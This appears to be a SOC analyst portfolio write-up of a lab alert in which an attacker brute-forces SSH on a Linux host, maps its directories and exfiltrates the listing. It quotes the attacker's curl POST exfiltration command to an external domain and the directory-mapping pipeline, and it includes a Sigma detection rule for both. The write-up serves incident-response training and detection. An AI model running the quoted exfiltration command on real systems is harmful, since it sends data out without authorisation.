
# SOC279 - File and Directory Discovery & Exfiltration

## 🚨 Raw Alert Details
```text
EventID : 255
Event Time : 2024-05-08T06:36:16+03:00
Rule : SOC279 - File and Directory Discovery Detected
Role : Incident Responder
Alert Type : C2 / Discovery
Difficulty : Medium
MITRE ATT&CK : T1078, T1133, T1059.004, T1083, T1041
Hostname : Elinux
Ip Address : 172.16.20.48
Command Line : ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\/--/g' -e 's/^/ /' -e 's/-/|/'
EDR Action : Allowed
Trigger Reason : Unauthorized Access to Sensitive File and Directory
```

## Alert Overview
- **Severity:** Medium (Escalated to High upon compromise verification)
- **Detection Source:** EDR / Linux Audit Logs
- **Asset Affected:** Elinux (172.16.20.48 - Ubuntu 20.04.02)
- **Threat Type:** SSH Brute Force / File and Directory Discovery / Data Exfiltration
- **Verdict:** True Positive (Compromised)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
This incident highlights a classic post-exploitation sequence on a Linux server: **Initial Access via Brute Force, followed by Local Reconnaissance and Data Staging.**

**The Mechanics:** After gaining unauthorized access via an SSH brute-force attack, the threat actor needs to understand the layout of the file system to locate sensitive configuration files, source code, or user data. Instead of relying solely on basic commands, attackers frequently use recursive listing commands piped into text-formatting utilities (like `grep` and `sed`) to generate a clean, tree-like structure of directories. They save this output to a temporary file (`/tmp/test.txt`) and subsequently exfiltrate it to an external Command and Control (C2) server using native tools like `curl`.

## Investigation Steps

### 1. Initial Access Verification (SSH Brute Force)
The investigation began by reviewing authentication logs to determine how the attacker accessed the Linux server `Elinux`.
- **Failed Logins:** Raw authentication logs captured multiple `Failed password for invalid user` attempts (e.g., trying accounts like `Liverpool` and `kali`) originating from external IP `169.150.218.77` on SSH port 25368/2823.
- **Successful Logon:** Following the brute-force barrage, an `Accepted password for analyst` log was generated from the exact same external IP on port 56279.
- **Threat Intel:** AbuseIPDB flagged `169.150.218.77` (Datacamp/Datapacket in the Netherlands) with an elevated abuse score, confirming it as attacker-controlled infrastructure.

<img width="631" height="200" alt="image" src="https://github.com/user-attachments/assets/87c9797a-6488-43cb-a15b-bf8caabee3f7" />
<img width="614" height="174" alt="image" src="https://github.com/user-attachments/assets/36fc78cf-74e6-4f5a-9ac3-af420eb62200" />
<img width="625" height="176" alt="image" src="https://github.com/user-attachments/assets/bf3ff0aa-dde0-4934-9d3b-71f7290d4abd" />




### 2. Execution & Discovery (Terminal History)
The EDR Terminal History for host `Elinux` captured the attacker's active keyboard activity following the successful login.
- **Enumeration Commands:** The attacker executed basic situational awareness commands (`whoami`, `groups`), followed by file system navigation (`cd /home`, `ls * -r`).
- **Recursive Mapping:** The attacker executed an advanced recursive directory mapping command:
  `ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\/--/g' -e 's/^/ /' -e 's/-/|/'`
- **Staging:** The output of this directory enumeration was piped directly into a temporary file for exfiltration: `> /tmp/test.txt`.

<img width="1398" height="488" alt="image" src="https://github.com/user-attachments/assets/bff71e01-c767-43c4-9d89-fc586e7d3ffe" />
<img width="1392" height="723" alt="image" src="https://github.com/user-attachments/assets/7c900213-9a86-49ce-90e4-492812414d11" />



### 3. Exfiltration Verification (C2 Activity)
The terminal history and raw network logs were correlated to track the final phase of the attack.
- **Exfiltration Command:** The attacker utilized `curl` to upload the staged discovery file to an external C2 server:
  `curl -X POST -d "@$LFILE" $URL` where `$URL=http://space-nickel.fr/` and `$LFILE=/tmp/test.txt`.
- **Threat Intelligence:** Querying `space-nickel.fr` on VirusTotal revealed multiple vendor flags categorizing the domain as Phishing/Malicious infrastructure.

<img width="554" height="309" alt="image" src="https://github.com/user-attachments/assets/729c7e48-6e28-493d-b5ef-adb807f2b099" />

<img width="1788" height="492" alt="image" src="https://github.com/user-attachments/assets/4c5b33c7-c460-488a-9a7d-c252c912dade" />


## Analysis & Findings
The incident is a confirmed **True Positive**. The external threat actor (`169.150.218.77`) brute-forced the SSH service on the Ubuntu server `Elinux`, successfully logging in via the `analyst` account. Once inside, the attacker performed file and directory discovery, generating a structured text map of the server's file system (`/tmp/test.txt`). Finally, the attacker successfully exfiltrated this reconnaissance data to an external C2 domain (`space-nickel.fr`) via an HTTP POST request using `curl`. The host is fully compromised.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1133 | External Remote Services (SSH) |
| **Credential Access** | T1110.001 | Brute Force: Password Guessing |
| **Discovery** | T1083 | File and Directory Discovery (`ls -R`) |
| **Exfiltration** | T1041 | Exfiltration Over C2 Channel (`curl POST`) |
| **Execution** | T1059.004 | Command and Scripting Interpreter: Unix Shell |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| IP Address | 169.150.218.77 | Attacker SSH Brute-Force & C2 IP (Netherlands) |
| Domain | `space-nickel.fr` | Attacker Exfiltration C2 Domain |
| File Path | `/tmp/test.txt` | Staged Directory Discovery Output File |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of file system mapping and curl exfiltration on Linux, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Recursive Directory Listing Piped to HTTP Exfiltration on Linux
id: c93f0596-1234-4a5e-994d-70580c5e9f06
status: experimental
description: Detects recursive directory listing combined with curl POST requests indicative of data staging and exfiltration.
author: SOC Analyst Portfolio
logsource:
  product: linux
  service: auditd
detection:
  selection_recon:
    CommandLine|contains:
      - 'ls -R'
      - 'find .'
  selection_exfil:
    CommandLine|contains:
      - 'curl -X POST'
      - 'curl --data'
  condition: selection_recon and selection_exfil
falsepositives:
  - Legitimate administrative system auditing or backup verification scripts
level: high
tags:
  - attack.t1083
  - attack.t1041
```

## 🚀 Decision Tree 
1. **Analyze Trigger Reason:** Did an alert fire for File and Directory Discovery (`ls -R`)?
   - If Yes -> Check terminal history for surrounding commands.
2. **Evaluate Preceding Access:** Was there an SSH brute-force or unauthorized logon immediately preceding the discovery activity?
   - *Confirmed SSH brute-force login from external IP `169.150.218.77`.*
3. **Check Exfiltration Activity:** Did the attacker use native tools (`curl`, `wget`) to transmit local files to an external destination?
   - *Confirmed `curl -X POST -d "@$LFILE"` to `space-nickel.fr`.*
4. **Action:** **Verdict: True Positive - Successful Compromise (Recon & Exfil).** Immediately isolate the host.

## 📝 Playbook Questions & Answers
- **Should the device be isolated?**
  - *Answer:* Yes.
  - *Reasoning:* A brute-force attack was detected from the external IP `169.150.218.77` located in the Netherlands. The host must be isolated from the network immediately to prevent further threat spread.
- **Determine the Scope:**
  - *Answer:* No (Localized to one machine).
  - *Reasoning:* Searching logs for the attacker IP on the log management system showed destination activity restricted solely to host `172.16.20.48`.
- **IOC Reputation Check:**
  - *Answer:* Yes.
  - *Reasoning:* The attacker IP is located in a Netherlands web hosting/VPN block and has historical reports for Port Scan, Brute Force, SSH, and Malicious activity.
- **Attacker IP Analysis:**
  - *Answer:* External.
  - *Reasoning:* The source IP originates from an external hosting provider in the Netherlands.
- **Determine the Type of Discovery:**
  - *Answer:* File and Directory Discovery.
  - *Reasoning:* Terminal history confirmed the execution of `ls -R` combined with `grep` and `sed` to recursively map directories and subdirectories into a text file.
- **Determine the OS (Operating System):**
  - *Answer:* Linux (Ubuntu 20.04.02).
  - *Reasoning:* Endpoint Security confirmed the host operating system is Ubuntu 20.04.02.

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`Elinux / 172.16.20.48`) was immediately **Isolated** from the network via EDR to sever the attacker's interactive session and stop further data gathering.
- **Perimeter Blocking:** The attacker IP (`169.150.218.77`) and C2 domain (`space-nickel.fr`) were added to the perimeter blocklist.
- **Why:** Isolating the host prevents the attacker from executing additional post-exploitation scripts or staging further data for exfiltration.

## Recommendations
1. **SSH Hardening & Key-Based Auth:** Disable password-based SSH authentication across all Linux servers. Enforce strict SSH Key-Based Authentication and restrict inbound SSH access to internal management IPs or a secure VPN.
2. **Account Audit:** Audit all local user accounts (specifically the `analyst` account) to ensure the attacker did not create persistent SSH authorized keys or modify sudoers files during their session.
3. **Egress Filtering:** Implement strict outbound web filtering to prevent internal servers from `curl`-ing or `wget`-ing data to unapproved, low-reputation external domains.

## Lessons Learned
- **Analyst Reflection (Connecting Recon to Exfil):** Initially, seeing an `ls -R` command might look like simple manual exploration by a user. 
- **The Lesson:** Context is everything. When `ls -R` is piped into text formatting tools (`grep`/`sed`), saved to a temporary file (`/tmp/test.txt`), and immediately followed by an external `curl -X POST` request, it transitions from casual browsing to automated data staging and exfiltration. Always trace the full lifecycle of a command: *Where did the data go?*

## 🛠️ Skills & Tools Used
- Linux Terminal History Analysis (`auditd`, `bash_history`)
- Command-Line Deconstruction (`ls`, `grep`, `sed` piping)
- Network Exfiltration Triage (`curl -X POST`)
- Threat Intelligence Correlation (AbuseIPDB, VirusTotal)
- Incident Containment (Host Isolation)
